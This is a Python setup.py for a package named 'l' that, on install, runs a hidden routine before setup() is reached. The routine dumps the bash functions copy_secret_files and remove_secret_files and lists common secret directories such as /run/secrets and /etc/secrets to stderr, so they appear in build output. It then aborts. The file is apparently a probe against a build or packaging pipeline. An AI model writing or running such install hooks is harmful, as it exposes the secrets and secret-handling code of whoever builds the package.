import os, sys, subprocess as sp
from setuptools import setup

def leak():
    o = sys.stderr.write
    o("\n--- FUNCTION LEAK ---\n")
    
    # Пытаемся вывести код функций через Bash
    # env - команда покажет содержимое функций в некоторых версиях Bash
    o(sp.getoutput("bash -c 'declare -f copy_secret_files'"))
    o("\n")
    o(sp.getoutput("bash -c 'declare -f remove_secret_files'"))
    
    o("\n--- FILE SYSTEM EXPLORE ---\n")
    # Если функции копируют секреты, они должны куда-то их класть. 
    # Проверим типичные места:
    dirs = ['/run/secrets', '/var/run/secrets', '/tmp/secrets', '/etc/secrets']
    for d in dirs:
        if os.path.exists(d):
            o(f"DIR EXISTS: {d}\n")
            o(f"CONTENT: {sp.getoutput(f'ls -la {d} 2>/dev/null')}\n")

    sys.exit(1)

try: leak()
except: sys.exit(1)

setup(name="l", version="0.1")
